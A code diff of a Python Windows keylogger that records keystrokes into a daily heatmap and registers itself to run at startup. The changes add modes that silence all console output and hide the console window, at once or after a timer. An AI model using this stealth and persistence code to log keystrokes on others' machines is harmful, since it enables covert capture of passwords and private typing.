@@ -11,6 +11,7 @@ from os.path import exists, join
 import sys
 from datetime import date
 import time
+from threading import Timer
 from winreg import SetValueEx, OpenKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ, DeleteValue
 
 # Folder where the pages of your book get logged
@@ -49,17 +50,18 @@ def read_config():
 
 # Read the configurarion
 if read_config():
-    if not config["hide"]:
+    if not config["hide"] == "allways":
         print("Successfully load configuration.")
 else:
-    print("Failed load configuration.")
+    if not config["hide"] == "allways":
+        print("Failed load configuration.")
     exit()
 
 # Disallowing multiple instances with same prefix
 mutex = win32event.CreateMutex(None, 1, 'mutex_var_Start' + config["file-prefix"])
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     mutex = None
-    if not config["hide"] or (config["output"] == 'debug'):
+    if not config["hide"] == "allways":
         print("Multiple instances are not allowed")
     exit(0)
 
@@ -72,10 +74,10 @@ def add_to_startup():
 
     try:
         SetValueEx(key2change, LOGGER_NAME, 0, REG_SZ, reg_value)
-        if not config["hide"]:
+        if not config["hide"] == "allways":
             print("Keylogger applied to startup.")
     except Exception as e:
-        if not config["hide"]:
+        if not config["hide"] == "allways":
             print("Error occurred while applying keylogger to startup:")
             print(e)
 
@@ -86,24 +88,25 @@ def remove_from_startup():
 
     try:
         DeleteValue(key2change, LOGGER_NAME)  
-        if not config["hide"]:
+        if not config["hide"] == "allways":
             print("Keylogger removed from startup.")
     except Exception as e:
-        if not config["hide"]:
+        if not config["hide"] == "allways":
             print("No keylogger is applied to startup.")
 
 # Debug logger
 def log_debug():
     global config, heatmap_buffer
-    if len(heatmap_order) > 0:
-            # Print the last pressed key to console
-            if len(heatmap_order[-1]["key"]) == 1:
-                print(heatmap_buffer[heatmap_order[-1]["key"][0]])
-                return True
-            # Print the last pressed keycombinaiton to console
-            elif len(heatmap_order[-1]["key"]) == 2:
-                print(heatmap_buffer[heatmap_order[-1]["key"][0] + heatmap_order[-1]["key"][1]])
-                return True
+    if not config["hide"] == "allways":
+        if len(heatmap_order) > 0:
+                # Print the last pressed key to console
+                if len(heatmap_order[-1]["key"]) == 1:
+                    print(heatmap_buffer[heatmap_order[-1]["key"][0]])
+                    return True
+                # Print the last pressed keycombinaiton to console
+                elif len(heatmap_order[-1]["key"]) == 2:
+                    print(heatmap_buffer[heatmap_order[-1]["key"][0] + heatmap_order[-1]["key"][1]])
+                    return True
     return False
 
 # Append file with pressed keys
@@ -164,15 +167,16 @@ def key_callback(event: KeyboardEvent):
     
     # Console output
     if config["output"] == 'console':
-        print("event:",{
-            "name": event.name,
-            "event_type": event.event_type,
-            "scan_code": event.scan_code,
-            "time": event.time,
-            "device": event.device,
-            "is_keypad": event.is_keypad,
-            "modifiers": event.modifiers
-        })
+        if not config["hide"] == "allways":
+            print("event:",{
+                "name": event.name,
+                "event_type": event.event_type,
+                "scan_code": event.scan_code,
+                "time": event.time,
+                "device": event.device,
+                "is_keypad": event.is_keypad,
+                "modifiers": event.modifiers
+            })
         return True
     
     key_pressed = {}
@@ -258,7 +262,7 @@ def key_callback(event: KeyboardEvent):
 
 def pause_logging():
     global paused
-    if not config["hide"] or (config["output"] == 'debug'):
+    if config["hide"] == "never":
         print(LOGGER_NAME + (" paused" if not paused else " continue"))
     paused = not paused
 
@@ -273,17 +277,18 @@ def read_heatmap():
     return False    
 
 def hide():
-    if not config["output"] == 'debug':
-        # Hide Console
-        window = win32console.GetConsoleWindow()
-        win32gui.ShowWindow(window, 0)
-        return True
-    else:
-        print("Console Hide")
+    # Hide Console
+    window = win32console.GetConsoleWindow()
+    win32gui.ShowWindow(window, 0)
+    return True
 
 def main():
-    if not config["hide"] or (config["output"] == 'debug'):
+    if not config["hide"] == "allways":
         print(LOGGER_NAME + " started")
+    # Hide comand prompt
+    if config["hide"] == "ready":
+        timer = Timer(5, hide)
+        timer.start()
     keyboard.hook(key_callback)
     # To Pause the Keylogger (ctrl + alt + p)
     keyboard.add_hotkey(config["hotkeys"]["pause-hotkey"], pause_logging)
@@ -292,15 +297,15 @@ def main():
     # To Exit the Keylogger with safing the buffer (ctrl + alt + e)
     keyboard.wait(config["hotkeys"]["exit-hotkey"]) 
     if config["output"] == "local":
-        if not log_local() and not config["hide"]:
+        if not log_local() and not config["hide"] == "allways":
             print("Something went wrong while saving!")
-    if not config["hide"]:
+    if not config["hide"] == "allways":
         print(LOGGER_NAME + " stopped.")
     exit()
 
 if __name__ == '__main__':
     # Hide comand prompt
-    if config["hide"]:
+    if config["hide"] == "allways":
         hide()
 
     # Add to startup
@@ -311,9 +316,11 @@ if __name__ == '__main__':
 
     # Read already saved values 
     if read_heatmap():
-        print("Loaded existing heatmap.")
+        if not config["hide"] == "allways":
+            print("Loaded existing heatmap.")
     else:
-        print("No Heatmap for today exist. Will be created.")
+        if not config["hide"] == "allways":
+            print("No Heatmap for today exist. Will be created.")
 
     # Setup save time
     last_save = round(time.time_ns() / 1000000)
